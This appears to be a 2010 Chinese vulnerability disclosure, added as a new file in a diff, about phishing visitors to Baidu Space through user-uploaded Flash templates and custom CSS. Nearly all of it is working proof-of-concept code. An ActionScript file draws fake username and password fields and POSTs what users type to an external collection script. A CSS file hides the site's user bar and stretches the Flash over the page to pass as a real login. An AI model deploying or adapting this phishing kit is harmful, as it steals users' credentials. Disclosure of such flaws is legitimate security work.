@@ -1,0 +1,111 @@
+hi.baidu.com Phishing With Flash
+
+Author: pz
+Blog: http://hi.baidu.com/p__z
+Team: http://www.80vul.com
+date: 2010年7月6日
+
+一 综述
+
+百度空间在个人主页应用上传自定义的Flash模板,Flash显示在主页上的时,HTML容器的 allowNetworking=internal.使得用户上传的flash可以和网络进行通信.再结合百度空间的CSS编辑,可以进行钓鱼攻击.
+
+二 PoC
+
+见http://hi.baidu.com/p__z
+
+==phishing.fla==================================
+stop();
+// show once
+var my_so:SharedObject = SharedObject.getLocal("cookie");
+if (!my_so.data.isloaded) {
+my_so.data.isloaded = true;
+my_so.flush();
+} else {
+clearAll();
+}
+var myformat:TextFormat = new TextFormat();
+myformat.font = "宋体";
+myformat.size = 13;
+this.createTextField("username_txt", this.getNextHighestDepth(), 569, 139, 137, 22);
+username_txt.border = false;
+username_txt.type = "input";
+username_txt.text = "";
+username_txt.onChanged = function(textfield_txt:TextField) {
+username_txt.setTextFormat(myformat);
+};
+this.createTextField("password_txt", this.getNextHighestDepth(), 569, 171, 137, 22);
+password_txt.border = false;
+password_txt.type = "input";
+password_txt.password = true;
+password_txt.onChanged = function(textfield_txt:TextField) {
+password_txt.setTextFormat(myformat);
+};
+function clearAll() {
+username_txt.removeTextField();
+password_txt.removeTextField();
+_root.gotoAndStop(2);
+}
+submit.onPress = function() {
+var send_lv:LoadVars = new LoadVars();
+send_lv.un = username_txt.text;
+send_lv.pass = password_txt.text;
+send_lv.sendAndLoad("http://www.80vul.com/sobb/c.php", send_lv, "POST");
+clearAll();
+};
+b1.onPress = function() {
+clearAll();
+};
+b2.onPress = function() {
+clearAll();
+};
+b3.onPress = function() {
+clearAll();
+};
+============================================
+
+
+==phishing.css==================================
+
+/*用户状态导航条隐藏*/
+html body center div#usrbar{
+background-color:#F5C969!important;
+}
+html body center div#usrbar nobr{
+background-color:#F5C969!important;
+color:#F5C969!important;
+}
+html body center div#usrbar nobr span{
+display:none!important;
+}
+html body center div#usrbar a,html body center div#usrbar a:link,html body center div#usrbar a:visited,html body center div#usrbar a:hover{
+color:#F5C969!important;
+}
+/*设置embed大小*/
+#sp_beautify_items_wrapper{border: 0pt none;z-index: 65530;position: absolute; left: 0px; top: 0px;}
+html body embed {
+height:1300px;
+width:1300px;
+position:absolute;
+left:0px;
+top:0px;
+}
+html body object{
+height:1300px;
+width:1300px;
+position:absolute;
+left:-120px;
+top:-400px;
+}
+/*模块"隐藏"去除*/
+.sp-beautify-item-head {display:none;}
+/*模块边框去除*/
+.sp-beautify-item beautify-item-11 {height:0px;width:0px;}
+============================================
+
+
+三 补丁[fix]
+
+等待官方补丁
+
+poc.rar
+
